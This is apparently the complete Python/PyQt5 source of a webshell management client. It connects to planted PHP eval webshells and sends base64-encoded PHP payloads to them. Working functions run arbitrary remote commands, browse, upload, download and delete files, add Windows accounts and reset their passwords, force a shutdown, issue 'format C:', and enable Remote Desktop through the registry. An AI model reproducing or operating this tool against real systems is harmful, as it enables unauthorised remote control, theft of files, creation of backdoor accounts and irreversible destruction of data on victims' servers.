import sys,base64,os,webbrowser,urllib.request,urllib.parse
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from GUI.maingui import Ui_MainWindow
from GUI.addshell import Ui_Form
from GUI.useradd import Ui_adduserForm
from GUI.changepassword import Ui_changepassword
from GUI.filerename  import Ui_renameForm
class MainWindows(QtWidgets.QMainWindow,Ui_MainWindow): #主窗口
    def __init__(self,parent=None):
        super(MainWindows,self).__init__(parent)
        #self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint) #去掉标题栏
        self.Ui = Ui_MainWindow()
        self.Ui.setupUi(self)
        self.setWindowIcon(QtGui.QIcon('./img/main.png'))
        self.setFixedSize(self.width(), self.height()) #设置宽高不可变
        self.Ui.exit.clicked.connect(QtCore.QCoreApplication.instance().quit)  #退出
        self.timer = QTimer()  #设定一个定时器用来显示时间
        self.timer.timeout.connect(self.showtime)
        self.timer.start()

        self.Ui.listWidget.installEventFilter(self)  #初始化QListView控件焦点事件
        self.Ui.treeWidget_2.installEventFilter(self)  #初始化treeWidget_2控件焦点事件
        self.readshellfile()  #加载文件到listweight
        self.Ui.treeWidget.doubleClicked.connect(self.displayfile) #teeweight双击
        self.Ui.zhixing.clicked.connect(self.shellcommand)  #虚拟终端执行按钮
        self.Ui.clearbutton.clicked.connect(self.clearVirtual)  #虚拟终端清空按钮
        self.Ui.savejiaoben.clicked.connect(self.SaveJiaoben)  #保存脚本
        self.Ui.clearjiaoben.clicked.connect(self.ClearJiaoben) #清空脚本
        self.Ui.user.clicked.connect(self.User)  #查询用户
        self.Ui.adduser.clicked.connect(self.useraddshow)#添加用户按钮
        self.Ui.passwd.clicked.connect(self.changepasswdshow)  # 修改密码
        self.Ui.shutdown.clicked.connect(self.Shutdown)  #强制关机
        self.Ui.format.clicked.connect(self.Format)  #格式化C盘
        self.Ui.open3389.clicked.connect(self.Open3389)  # 开启3389
        self.Ui.chinese.clicked.connect(self.Chinese) #中文检测
        self.Ui.update.clicked.connect(self.Update)  #检查更新
        self.Ui.loveme.clicked.connect(self.Loveme)  #联系作者


        #self.Ui.textEdit.returnPressed.connect(self.Virtualshellgetdata)  # 信

       # self.connect(self.Ui.textEdit, SIGNAL("returnPressed()"), self.Virtualshellgetdata)



    def readshellfile(self):  #读取shell文件
        try:
            with open("shell.txt", 'r',encoding='utf-8') as f:  # 打开文件
                for each in f:  # 遍历文件

                    each = each.replace('\n', '')  # 替换换行符为空格
                    if each !="                                  shell 地 址                                      密码":
                        self.Ui.listWidget.addItem(each)  # 添加到列表
                f.close()  # 关闭文件
        except:
            pass
    def eventFilter(self, widget, event):  #重写焦点响应事件
        if (widget != None):
            #print(currentitem)

            if (widget.inherits("QListWidget")):  #创建添加shell菜单
                self.createContextMenu()

            elif (widget.inherits("QTreeWidget")):#创建文件菜单
                self.fileContextMenu()
            else:
                pass

            return False

    # def keyPressEvent(self, event):
    #     # 这里event.key（）显示的是按键的编码
    #
    #     if (event.key() == QtCore.Qt.Key_Enter):
    #         print("aa")
    #     else:
    #         print("bbbbbb")

        # print("按下：" + str(event.key()))
        # if str(event.key()) == '16777220':  # 回车
        #     print('ok')


    def showtime(self):  #显示时间
        datetime = QDateTime.currentDateTime()
        text = datetime.toString("yyyy-MM-dd hh:mm:ss")
        self.Ui.timelabel.setText(text)

## shell管理的右键菜单
    def createContextMenu(self):
        '''''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号

        self.Ui.listWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.listWidget.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.connect_shell_button = self.contextMenu.addAction(u'连接')
        self.add_shell_button = self.contextMenu.addAction(u'添加')
        self.modify_shell_button = self.contextMenu.addAction(u'编辑')
        self.delete_shell_button = self.contextMenu.addAction(u'删除')
        self.delete_all_shell_button = self.contextMenu.addAction(u'清空')

        # 将动作与处理函数相关联
        # 这里为了简单，将所有action与同一个处理函数相关联，
        # 当然也可以将他们分别与不同函数关联，实现不同的功能
        self.connect_shell_button.triggered.connect(self.Connect_shell)
        self.add_shell_button.triggered.connect(self.Add_shell_show)
        self.modify_shell_button.triggered.connect(self.Modify_shell)
        self.delete_shell_button.triggered.connect(self.Delete_shell)
        self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)


    #
    def fileContextMenu(self):
        '''''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.Ui.treeWidget_2.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.file_update = self.contextMenu.addAction(u'更新')
        self.file_upload = self.contextMenu.addAction(u'上传')
        self.file_download = self.contextMenu.addAction(u'下载')
        self.file_delete = self.contextMenu.addAction(u'删除')
        self.file_rename =self.contextMenu.addAction(u'重命名')

        #将动作与处理函数相关联
        #这里为了简单，将所有action与同一个处理函数相关联，
        #当然也可以将他们分别与不同函数关联，实现不同的功能
        self.file_update.triggered.connect(self.File_update)
        self.file_upload.triggered.connect(self.File_upload)
        self.file_download.triggered.connect(self.File_download)
        self.file_delete.triggered.connect(self.File_delete)
        self.file_rename.triggered.connect(self.renameshow)

    def showContextMenu(self, pos):  #右键点击时调用的函数
        # 菜单显示前，将它移动到鼠标点击的位置
        self.contextMenu.move(QtGui.QCursor.pos())
        self.contextMenu.show()

    #连接
    def Connect_shell(self):
        #shell = self.Ui.listWidget.currentRow() #获取选择项的行号
        try:
            shell = self.Ui.listWidget.currentItem().text()  # 返回选择行的数据
            #shell2 = self.Ui.shelllabel.text()  # 获取shell
            #print(shell)
            shell2 = shell.split("          ")  #
            #print(shell)
            #print(shell2[1])
            phpcode = "echo(hello);"
            phpcode=base64.b64encode(phpcode.encode('GB2312'))
            #print(phpcode)
            data = { shell2[1] : '@eval(base64_decode($_POST[z0]));' ,
                     'z0':  phpcode}
            #print(data)
            returndata =self.filedir(shell2,data)
            #print(returndata)
            if returndata != "":
                #print(returndata)
                box = QtWidgets.QMessageBox()
                #self.statusBar().showMessage(shell )  # 状态栏显示信息
                box.information(self, "提示", "连接成功！")
                self.Ui.shelllabel.setText(shell)
                self.File_update()  #显示目录
                self.Virtualshell()

            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接失败！")
        except:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "连接失败！")

    # 调用子窗口显示
    def Add_shell_show(self):
            self.WChild = Ui_Form()
            self.dialog = QtWidgets.QDialog(self)
            self.WChild.setupUi(self.dialog)
            self.dialog.show()
            sender = self.sender()

            if sender.text() == "添加":
                self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
            elif sender.text() == "编辑":
                self.WChild.pushButton.clicked.connect(self.editLine)  # 子窗体确定编辑shell

    #添加用户窗口
    def useraddshow(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            self.adduser = Ui_adduserForm()
            self.dialog = QtWidgets.QDialog(self)
            self.adduser.setupUi(self.dialog)
            self.dialog.show()
            self.adduser.userButton.clicked.connect(self.Adduser)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    def changepasswdshow(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            self.changepasswd = Ui_changepassword()
            self.dialog = QtWidgets.QDialog(self)
            self.changepasswd.setupUi(self.dialog)
            self.dialog.show()
            self.changepasswd.changeuserButton.clicked.connect(self.Changepasswd)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")


    #添加shell
    def GetLine(self):  # 添加shell给listweiget传值
            url = self.WChild.lineEdit.text()
            passwd = self.WChild.lineEdit_2.text()
            if(url == "" or passwd ==""):   #判断地址或者密码是不是空
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "地址或密码不能为空！")
            else:
                data =url+"          "+passwd  #得到添加shell的内容并组合
                self.Ui.listWidget.addItem(data)   #添加内容
                self.dialog.close()
    #编辑shell  得到值赋值给子框
    def Modify_shell(self):
        try:
            shell = self.Ui.listWidget.currentItem().text()  #获取选中行的文本
            self.Add_shell_show()    #显示子窗口
            shell = shell.split("          ")   #分割数据
            self.WChild.lineEdit.setText(shell[0])   #给子窗口赋值
            self.WChild.lineEdit_2.setText(shell[1])
            self.WChild.pushButton.setText("编辑")
            #删除选中的行
        except:
            box = QtWidgets.QMessageBox()
            box.warning(self, "提示", "请选择一项！")

    #赋值给原来的项
    def editLine(self):
        url = self.WChild.lineEdit.text()  #获取子窗口的值
        passwd = self.WChild.lineEdit_2.text()
        data = url + "          " + passwd
        shell = self.Ui.listWidget.currentRow() #获取选择项的行号
        self.Ui.listWidget.item(shell).setText(data)   #给listwidget赋值
        self.dialog.close()   #关闭子窗口

    #删除选中的shell
    def Delete_shell(self):
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要删除选中的项吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:
            shell = self.Ui.listWidget.currentRow()  # 获取选择项的行号
            # shell = self.Ui.listWidget.currentItem().text()  # 返回选择行的数据
            shell2 = self.Ui.listWidget.currentItem().text()
            self.Ui.listWidget.takeItem(shell)  # 删除listwidget中的数据
        else:
            return

    #清空所有
    def Delete_all_shell(self):
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要清空所有内容吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:
            try:
                self.Ui.listWidget.clear()
                f = open("shell.txt", "w", encoding='utf-8')  # 打开文件
                f.write('您没有保存任何shell')  # 写入文件
                f.close()
            except:
                pass
        else:
            return
###文件操作
    #更新缓存
    def File_update(self):
        shell = self.Ui.shelllabel.text()
        if shell!="":
        #列出目录
            self.Ui.treeWidget.clear() #清空treeweight的所有内容
            self.Ui.treeWidget_2.clear() #清空treeweight_2的所有内容

            #phpcode = '$D="C:";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
            path=["C:","D:","E:"]   #列出3个盘
            #print(path)

            for i in path:  #循环列出c盘  D盘

                data=self.listfile(i)   #调用列出目录
                data = data.decode('utf-8',"ignore")
                #print(data)
                if data =='ERROR:// Path Not Found Or No Permission!':  #判断3个盘是不是存在
                    pass
                else:  #若存在 列出目录
                    listdata = data.split('  ')   # 分割data
                    root = QTreeWidgetItem(self.Ui.treeWidget)  #创建对象
                    #self.tree = QTreeWidget()
                    root.setText(0,i)  #创建主节点

                    listdata=listdata[:-1]   #去掉空格
                    for i in listdata:  #循环每一个元素

                        singerdata = i.split("\t")   #用\t将名字大小权限修改时间分割

                        if singerdata[0][-1] == "/": #判断是不是有下级目录
                            singerdata[0]=singerdata[0][:-1]   #创建c盘下的子节点
                            child1 = QTreeWidgetItem(root)   #子节点位置
                            child1.setText(0, singerdata[0])   #子节点赋值
                        # else:
                        #     child2 = QTreeWidgetItem(child1)  # 创建子子节点
                        #     child2.setText(0, singerdata[0])  # 赋值

            #phpcode = "system('" + "dir" + "');"
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    def listfile(self,path):  #列出目录
        shell = self.Ui.shelllabel.text()  #获取shell
        #print(shell)
        shell = shell.split("          ")
        phpcode = '$D="' + path + '";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
        #print(phpcode)
        phpcode = base64.b64encode(phpcode.encode('GB2312'))
        #print(phpcode)
        data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                'z0': phpcode}
        #print(data)
        return self.filedir(shell,data)  #返回数据

  #显示当前对象的路径
    def showfilepath(self):
        #filename = self.Ui.treeWidget.currentItem().text(0)  #当前目录或文件名
        index = self.Ui.treeWidget.currentItem()   #当前的Item对象
        try:
            filepath = index.text(0)
            index2=index.parent().text(0)   #父节点
            filepath = index2+'\\\\'+index.text(0)  #组合
            index3=index.parent().parent().text(0)   #父父节点
            filepath = index3 + '\\\\' + filepath  #组合目录
            index4=index.parent().parent().parent().text(0)   #父父父节点
            filepath = index4 +'\\\\' + filepath  #组合目录
            index5=index.parent().parent().parent().parent().text(0)   #父父父父节点
            filepath = index5 +'\\\\' + filepath  #组合目录
            index6 = index.parent().parent().parent().parent().parent().text(0)  # 父父父父节点
            filepath = index6 + '\\\\' + filepath  # 组合目录
        except:
            pass
        #print(filepath)
        return filepath

    # treeweight鼠标双击显示详细信息
    def displayfile(self):
        try:
            index = self.Ui.treeWidget.currentItem()   #当前的Item对象
            #print(filepath)  #输出当前项的绝对目录
            data=self.listfile(self.showfilepath())   #调用函数显示数据
            data = data.decode('utf-8',"ignore")
            #print(data)
            listdata = data.split('  ')   #将文件分开
            #print(listdata)
            listdata = listdata[:-1]  #去掉最后的空
            #print(listdata)
            self.Ui.treeWidget_2.clear()  #清空treeweight_2中的所有数据
            for i in listdata:  # 循环每一个元素
                singerdata = i.split("\t")  # 用\t将名字大小权限修改时间分割
                #print(singerdata[0])
                if singerdata[0] !="./" and singerdata[0] != "../" and singerdata[0][-1]=="/" :
                    child2 = QTreeWidgetItem(index)  # 创建子子节点
                    child2.setText(0, singerdata[0][:-1])
                    #将文件详细信息写入到listweight_2
                if singerdata[0] != "./" and singerdata[0] != "../" and singerdata[0][-1]!="/":  #文件显示出来,不显示文件夹！！！
                    if singerdata[0][-1]=="/":  #去掉文件夹后面的斜杠
                        singerdata[0]=singerdata[0][:-1]
                    try:
                        singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                    except:
                        pass
                   # print(singerdata)
                    root = QTreeWidgetItem(self.Ui.treeWidget_2)  # 创建对象
                    #显示数据
                    root.setText(0, singerdata[0])
                    root.setText(1, singerdata[1])
                    root.setText(2, singerdata[3])
                    root.setText(3, singerdata[2])

        except:
            pass
  #换算文件的大小
    def Transformation(self,size):
        if (size < 1024):
            return str(size) + " B"
        elif 1024 < size < 1048576:
            size = round(size / 1024, 2)
            return str(size) + " KB"
        elif 1048576 < size < 1073741824:
            size = round(size / 1048576, 2)
            return str(size) + " MB"
        elif size > 107374824:
            size = round(size / 1073741824, 2)
            return str(size) + " GB"
        else:
            pass
    #文件打开对话框
    def fileopen(self):
        fileName, selectedFilter = QFileDialog.getOpenFileName(self,(r"上传文件"),(r"C:\windows"),r"All files(*.*);;Text Files (*.txt);;PHP Files (*.php);;ASP Files (*.asp);;JSP Files (*.jsp);;ASPX Files (*.aspx)")

        return (fileName)  #返回文件路径
    #保存文件对话框
    def filesave(self,filename):

        fileName, filetype= QFileDialog.getSaveFileName(self, (r"保存文件"), (r'C:\Users\Administrator\\'+ filename), r"All files(*.*)")
        #print(fileName)
        return fileName
    ##文件上传
    def File_upload(self):
        # 尝试获取文件路径
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            try:
                fileName =  self.fileopen()   #调用文件打开对话框
            #print(type(fileName))
                #print(fileName)
                try:
                    # 尝试打开文件读取数据
                    f = open(fileName,"rb")
                    fsize = os.path.getsize(fileName) #获取文件大小
                    filedata = f.read()
                    shell = shell.split("          ")
                    f.close()
                    #print(fsize)
                    #print(filedata)
                    #z2 = base64.b64encode(filedata)
                    newfileName=fileName.split("/")
                    #print(newfileName[-1])
                    path=self.showfilepath()+"\\\\"+newfileName[-1]
                    #print(path)
                    #shell = self.Ui.shelllabel.text()  # 获取shell
                    z = r"@eval(base64_decode($_POST[z0]));"  # 文件执行代码
                    z0 = base64.b64encode((str('$c=base64_decode($_POST["z2"]); echo(@fwrite(fopen("'+path+'","w"),$c));die();')).encode('utf-8'))
                    #z1 = base64.b64encode((str(path)).encode('utf-8')) # 文件路径加密
                    #print(filedata)
                    z2 = base64.b64encode(filedata)  # 文件数据加密
                    #print(z0)
                    #print(z1)
                    #print(z2)
                    data = {shell[1]:z,"z0":z0,"z2":z2}
                    #print(data)
                    result =self.filedir(shell,data)
                    result = result.decode('utf-8',"ignore")
                    #print(type(result))
                    #print(result)#
                    if int(result)==fsize:
                        self.displayfile()  #刷新显示
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "上传成功!\n上传路径: "+path)
                    else:
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "上传失败!")
                except:
                    f.close()
                    box = QtWidgets.QMessageBox()
                    box.warning(self, "提示", "文件太大。上传失败！")
            #文件路径获取失败
            except:
                pass
        else:
            box = QtWidgets.QMessageBox()
            # self.statusBar().showMessage(shell )  # 状态栏显示信息
            box.information(self, "提示", "请先连接shell！")
    #下载文件
    def File_download(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":  #判断是否连接shell
            try:
                path =self.showfilepath()  #获取文件的路径
                filepath = self.Ui.treeWidget_2.currentItem().text(0)  #获取文件名
                compath = path+"\\\\"+filepath  #组合路径
                phpcode = '$F = "' + compath + '";$fp=@fopen($F,"rb") or die("Unable to open file!") ;echo @fread($fp,filesize($F));@fclose($fp);die();'
                #print(filepath)
                #print(compath)
                #print(phpcode)
                returndata = self.sendcode(phpcode)  #尝试下载文件
                #print(returndata)
                #写入文件
                #print(returndata)

                if returndata != "" and returndata != "Unable to open file!":
                    savefilepath = self.filesave(filepath)
                    #print(filepath)
                    #print(savefilepath)
                    f = open(savefilepath, "wb")  # 打开文件
                    f.write(returndata)  # 写入文件
                    f.close()  # 关闭文件
                    box = QtWidgets.QMessageBox()
                    # self.statusBar().showMessage(shell )  # 状态栏显示信息
                    box.information(self, "提示", "下载成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    # self.statusBar().showMessage(shell )  # 状态栏显示信息
                    box.information(self, "提示", "下载失败！")
            except:
                box = QtWidgets.QMessageBox()
                # self.statusBar().showMessage(shell )  # 状态栏显示信息
                box.information(self, "提示", "下载失败！")
        else:
            box = QtWidgets.QMessageBox()
            # self.statusBar().showMessage(shell )  # 状态栏显示信息
            box.information(self, "提示", "请先连接shell！")

    #文件删除
    def File_delete(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell !="":
            try:
                path = self.showfilepath()  # 获取文件的路径
                filepath = self.Ui.treeWidget_2.currentItem().text(0)  # 获取文件名
                compath = path + "\\\\" + filepath  # 组合路径
                #print(compath)
                hitgroup= self.Ui.treeWidget_2.currentIndex().row()
                #删除文件
                shell = shell.split("          ")
                phpcode1 = "system('" + "del /S /Q "+compath + "');"
                self.sendcode(phpcode1)
                #删除目录
                phpcode2 = "system('" + "rd /S /Q " + compath + "');"
                self.sendcode(phpcode2)
                self.Ui.treeWidget_2.takeTopLevelItem(hitgroup)  #删除节点
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "删除成功！")
            except:
                pass
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

   #重命名对话框显示
    def renameshow(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
            if index != None:
                self.rename = Ui_renameForm()
                self.dialog = QtWidgets.QDialog(self)
                self.rename.setupUi(self.dialog)
                self.dialog.show()
                self.rename.renameButton.clicked.connect(self.File_rename)
            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "请选择要重命名的项！")
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    #重命名确定按钮
    def File_rename(self):
        #hitgroup = self.Ui.treeWidget_2.currentIndex().row()#获取要修改的行号
        renamefile = self.rename.renameedit.text() #获取要修改的文件名
        #print(renamefile)
        parentpath= self.showfilepath()  #获取路径
        #print(parentpath)
        index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
        filename = index.text(0)  # 获取文件名
        path = parentpath+"\\\\"+filename  #组合路径
        #print(path)
        phpcode = 'system("rename '+path+' '+renamefile+'");echo(ok);'  #重命名
        returndata=  self.sendcode(phpcode)  #发送数据

        returndata = returndata.decode('utf-8',"ignore")
        if returndata == "ok":
            self.dialog.close()  # 关闭子窗口
            self.displayfile()    #刷新显示
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "重命名", "重命名失败！")

    #虚拟终端
    def Virtualshell(self):
        self.Ui.textEdit.setReadOnly(True)  #设置textRdit不可编辑
        self.Ui.textEdit.setText(r"C:\Users\admin> ")
        # cursor = self.Ui.textEdit.textCursor()
        # cursor.movePosition(QtGui.QTextCursor.End)
        # self.Ui.textEdit.setTextCursor(cursor)

        # 获取框里的输入文本
        # strInfo = self.Ui.textEdit.toPlainText()
        # print(strInfo)
        #
        #
    #虚拟终端执行按钮
    def shellcommand(self):
        self.Ui.textEdit.clear()
        shellcommand = self.Ui.lineEdit.text()
        #print(shellcommand)
        if shellcommand !="":
            # print(shellcommand)
            # print(shell)
            phpcode = "system('" + shellcommand + "');"
            #print(phpcode)
            returncommand = self.sendcode(phpcode)
            #print(returncommand)
            #print(type(returncommand))
            if returncommand !=None:
                #print(returncommand)
                returncommand = returncommand.decode('gbk',"ignore")#解码utf8，忽略其中有异常的编码，仅显示有效的编码
                #print(returncommand)
                #print(type(returncommand))
                # print(returncommand)
                self.Ui.textEdit.setText(returncommand)
            else:
                pass
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "您未输入任何命令！")


    # 虚拟终端清空按钮
    def clearVirtual(self):
        self.Ui.lineEdit.clear()
        self.Ui.textEdit.clear()

    #给代码加密并发送
    def sendcode(self,phpcode):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            shell = shell.split("          ")
            phpcode = base64.b64encode(phpcode.encode('utf-8'))
            #print(phpcode)
            #phpcode = str(base64.b64encode(phpcode.encode('utf-8')), 'utf-8')
            data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}
            #print(data)
            return self.filedir(shell, data)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    #保存脚本
    def SaveJiaoben(self):
        data  = self.Ui.textEdit_3.toPlainText()  #获取textEdit_3的内容
        if data != "":
            try:
                path = self.filesave("jiaoben.txt")
                f= open(path,"w",encoding='utf-8')
                f.write(data)
                f.close()
            except:
                pass
        else:
            box = QtWidgets.QMessageBox()
            box.warning (self, "警告", "您未输入任何字符！")
    #脚本清空按钮
    def ClearJiaoben(self):
        self.Ui.textEdit_3.clear()

    #查询用户按钮
    def User(self):
        user = ""
        phpcode = 'system("net user");'
        #print(phpcode)
        data = self.sendcode(phpcode)
        #print(data)
        #print(data[113:-20])
        if data !=None:
            data = data.decode('gbk', "ignore")
            #print(data)
            data =data.split('-------------------------------------------------------------------------------')
            #print(data[1])
            data=data[1].replace('\r\n', '').split(" ")
            #print(data)
            # #print(data)
            for i in data[:-1]:
                if i !="":
                    user += "用户："+i+"\n"
            #print(user)
            box = QtWidgets.QMessageBox()
            box.about (self, "查询用户", user[:-1])
        else:
            pass
    #添加用户按钮
    def Adduser(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        username = self.adduser.userEdit.text()  #获取添加用户对话框用户名
        #print(username)
        password = self.adduser.passwordEdit.text() #获取添加用户对话框密码
        phpcode = 'system("net user '+username+" "+password+" "+'/add");' #组合命令
        #print(phpcode)
        returndata  = self.sendcode(phpcode)    #发送命令

        if returndata !="":
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "添加成功！")
        else:
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "添加失败！")
        #print(username)
        #print(password)
        #print(returndata)
        #print(data)
    #修改密码按钮调用的函数
    def Changepasswd(self):
        username = self.changepasswd.changeuserEdit.text()  #获取修改密码窗口的用户名
        passwd = self.changepasswd.changepasswordEdit.text() #获取修改密码窗口的密码
        #print(username)
        #print(passwd)
        phpcode = 'system("net user ' + username + " " + passwd +'" );'  # 组合命令
        #print(phpcode)
        returndata = self.sendcode(phpcode)  # 发送命令
        returndata = returndata.decode('gb2312',"ignore")
        #print(returndata[:6])
        #print(type(returndata))
        if returndata[:6] =="命令成功完成":
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "修改成功！")
        else:
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "没有此用户或没有权限，修改失败！")
    #强制关机按钮
    def Shutdown(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            button = QMessageBox.question(self, "警告！",
                                          self.tr("你确定要强制关机吗？"),
                                          QMessageBox.Ok | QMessageBox.Cancel,
                                          QMessageBox.Ok)
            if button == QMessageBox.Ok:

                shell = self.Ui.shelllabel.text()  # 获取shell
                phpcode = 'system("shutdown -p");echo(ok);'
                data = self.sendcode(phpcode)
                data = data.decode('utf-8',"ignore")
                print(data)
                if data!=None:
                    if data == "ok":
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "强制关机成功！")
                    else:
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "强制关机失败！")
                else:
                    pass
                #print(data)
            else:
                return
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    #格式化c盘
    def Format(self):
        shell = self.Ui.shelllabel.text()  # 获取shell
        if shell != "":
            data = QMessageBox.question(self, "警告！",
                                          self.tr("你确定要这么做吗，这将不可恢复？"),
                                          QMessageBox.Ok | QMessageBox.Cancel,
                                          QMessageBox.Ok)
            if data == QMessageBox.Ok:
                phpcode = 'system("format C:");echo(ok);'
                shell = shell.split("          ")  # 分割字符串写到shell列表
                phpcode = base64.b64encode(phpcode.encode('GB2312'))
                data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                        'z0': phpcode}
                returndata = self.filedir(shell,data)
                if returndata == 'ok':
                    box = QtWidgets.QMessageBox()
                    box.about(self, "提示", "操作成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.about(self, "提示", "操作失败！")
            else:
                return

        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
    #开启3389按钮
    def Open3389(self):

        phpcode ='system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");'
        result = self.sendcode(phpcode)

        if result !=None:
            data = self.sendcode('system("netstat -ano |findstr 0.0.0.0:3389");')
            data = data.decode('utf-8',"ignore")
            if data !=None:
                if data!="":
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "开启成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "抱歉，您没有权限！")
            else:
                return
        else:
            return

    #中文检测
    def Chinese(self):
        try:
            os.system("python 中文符号检测工具.py")
        except:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "模块不存在！")
    #检查更新
    def Update(self):
        box = QtWidgets.QMessageBox()
        box.about (self, "检查更新", "\n当前版本：V 1.0\n最新版本：V 1.0 ")
    #联系作者
    def Loveme(self):
        webbrowser.open("https://blog.csdn.net/qq_36374896")
        box = QtWidgets.QMessageBox()
        box.information (self, "联系作者", "作者邮箱：qianxiao996@126.com\n作者主页：https://blog.csdn.net/qq_36374896")

    # POST请求
    def filedir(self,shell,phpcode): #发送php请求
       #请求头
        headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded" #以表单的形式请求
        }
        #print(phpcode)
        #print(shell[0])
        #print(phpcode)

        postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")
        req = urllib.request.Request(shell[0], postData, headers)
        # 发起请求
        response = urllib.request.urlopen(req)
        #data = (response.read()).decode('utf-8')
        return (response.read())

    # 重载关闭事件  将listweight写入txt文件
    def closeEvent(self, event):
        num = self.Ui.listWidget.count()  #获取listweight行数
        #print(num)
        f=open("shell.txt", "w",encoding='utf-8')   # 打开文件
        for i in  range(0,num):
            data=self.Ui.listWidget.item(i).text()  #获取i行的数据
            #print(data)
            f.write(data + "\n")  # 写入文件
        f.close()  #关闭文件

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = MainWindows()
    window.show()
    sys.exit(app.exec_())

